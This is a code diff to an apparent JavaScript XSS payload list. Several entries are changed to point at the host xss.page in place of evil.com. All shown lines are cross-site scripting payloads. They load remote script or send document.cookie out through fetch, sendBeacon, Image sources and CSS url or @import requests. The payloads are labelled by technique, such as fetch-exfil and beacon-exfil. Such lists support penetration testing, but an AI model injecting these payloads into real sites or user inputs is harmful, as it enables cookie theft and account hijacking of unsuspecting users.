@@ -27,7 +27,7 @@ export const payloads = [
   },
   {
     id: 3,
-    payload: '<script src="//evil.com/xss.js"></script>',
+    payload: '<script src="//xss.page/xss.js"></script>',
     category: 'basic',
     technique: 'script-tag',
     context: 'html',
@@ -513,7 +513,7 @@ export const payloads = [
   // Modern Vectors
   {
     id: 49,
-    payload: '<img src onerror="fetch(\'//evil.com?\'+document.cookie)">',
+    payload: '<img src onerror="fetch(\'//xss.page?\'+document.cookie)">',
     category: 'modern',
     technique: 'exfiltration',
     context: 'html',
@@ -523,7 +523,7 @@ export const payloads = [
   },
   {
     id: 50,
-    payload: '<img src onerror="navigator.sendBeacon(\'//evil.com\',document.cookie)">',
+    payload: '<img src onerror="navigator.sendBeacon(\'//xss.page\',document.cookie)">',
     category: 'modern',
     technique: 'beacon',
     context: 'html',
@@ -1445,7 +1445,7 @@ export const payloads = [
   // More Modern Techniques
   {
     id: 138,
-    payload: '<script>fetch("//evil.com?"+document.cookie)</script>',
+    payload: '<script>fetch("//xss.page?"+document.cookie)</script>',
     category: 'modern',
     technique: 'fetch-exfil',
     context: 'html',
@@ -1455,7 +1455,7 @@ export const payloads = [
   },
   {
     id: 139,
-    payload: '<script>new Image().src="//evil.com?"+document.cookie</script>',
+    payload: '<script>new Image().src="//xss.page?"+document.cookie</script>',
     category: 'modern',
     technique: 'image-exfil',
     context: 'html',
@@ -1465,7 +1465,7 @@ export const payloads = [
   },
   {
     id: 140,
-    payload: '<script>navigator.sendBeacon("//evil.com",document.cookie)</script>',
+    payload: '<script>navigator.sendBeacon("//xss.page",document.cookie)</script>',
     category: 'modern',
     technique: 'beacon-exfil',
     context: 'html',
@@ -1565,7 +1565,7 @@ export const payloads = [
   // CSS Injection for Data Exfil
   {
     id: 149,
-    payload: '<style>@import url(//evil.com/?data);</style>',
+    payload: '<style>@import url(//xss.page/?data);</style>',
     category: 'css',
     technique: 'css-import-exfil',
     context: 'html',
@@ -1575,7 +1575,7 @@ export const payloads = [
   },
   {
     id: 150,
-    payload: '<style>*{background:url(//evil.com/?data)}</style>',
+    payload: '<style>*{background:url(//xss.page/?data)}</style>',
     category: 'css',
     technique: 'css-bg-exfil',
     context: 'html',
